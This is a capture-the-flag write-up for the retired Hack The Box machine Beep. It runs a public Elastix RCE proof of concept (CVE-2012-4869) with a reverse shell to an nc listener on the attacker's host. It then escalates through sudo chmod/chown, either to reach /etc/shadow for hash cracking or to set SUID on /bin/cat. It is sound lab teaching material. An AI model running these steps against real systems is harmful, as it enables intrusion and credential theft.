---
title: "Beep Write-Up"
date: 2025-06-23T15:59:14-05:00
draft: false
author: Jarpiano
tags: 
    - WriteUp
image: /images/beep-banner.png
description:
toc:
center: true
---

# Beep (Easy) Write-Up - HTB
Beep is a retired machine released back in 2017.
Upon preview, the description doesn't really give us a lot.

## Initial Foothold

<img src="/images/beep-desc.png" width="900" alt="Preview Image" />
<br>
<br>

We can enumerate through the website using a tool like `ffuf` or `gobuster`. Using either, we're able to map out the website. At face value though, there isn't a lot we 
can find. Let's view it with a browser. When using a browser, we get some issues viewing the site due to SSL configurations. We can deal with the issue by going to the about:config (FireFox) or equivalent for the browser and editing/adding: 

```
security.ssl.errorReporting.automatic (from true to false)
security.tls.version.min (from 2 to 1)
```

It seemed to fix our page! 

<img src="/images/beep-elastic.png" width="900" alt="Site preview" />
<br>
<br>

The login page shows us that the site uses **Elastix**. Searching up Elastic exploits, we find [CVE-2012-4869](https://www.exploit-db.com/exploits/18650) , a RCE vulnerability.

<br>
<img src="/images/beep-rce.png" width="900" alt="ExploitDB preview" />
<br>
<br>

We can look for a POC or try this out ourselves. I found a fairly recent POC from GitHub, [Elastix 2.2.0 CVE-2021-4869](https://github.com/cyberdesu/Elastix-2.2.0-CVE-2012-4869). 
```
git clone https://github.com/cyberdesu/Elastix-2.2.0-CVE-2012-4869
cd Elastix-2.2.0-CVE-2012-4869
python -m venv .venv
source .venv/bin/activate
pip install .
python exploit.py "<Target-IP>" --LHOST "<Attacker-IP>" --LPORT 9001
```
And on another we setup an `nc` listener on port 9001. rlwrap is optional.
```
rlwrap nc -lvnp 9001
```
On launching the script we get an SSL error. We can fix this by adding `context.set_ciphers('HIGH:!DH:!aNULL')` to the function near the top where `context` is declared. Now we're able to access a shell on the server. I use port 1234 below.

<br>
<img src="/images/beep-foothold.png" width="900" alt="foothold preview" />
<br>
<br>

When we go to one of the home directories, we find `user.txt` and use `cat` to print it out.

## Privilege Escalation

There are multiple approaches to get to root. On using `sudo -l`, I found some useful commands available to us. `chmod` and `chown` are particularly useful. We can use either to take ownership of the /etc/shadow file and crack the hash from there. But, let's look at the /root directory.

<br>
<img src="/images/beep-root.png" width="900" alt="root preview" />
<br>
<br>

When we try to use `chmod` or `chown` on the root.txt file, it doesn't seem to work. One way to overcome this is to make a binary that can print to stdout as root. The easiest method I found was setting the SUID bit for the /bin/cat binary using `cat`.

<br>
<img src="/images/beep-cat.png" width="900" alt="cat preview" />
<br>
<br>

We can know use /bin/cat to print out the root.txt file contents.

**Fin.**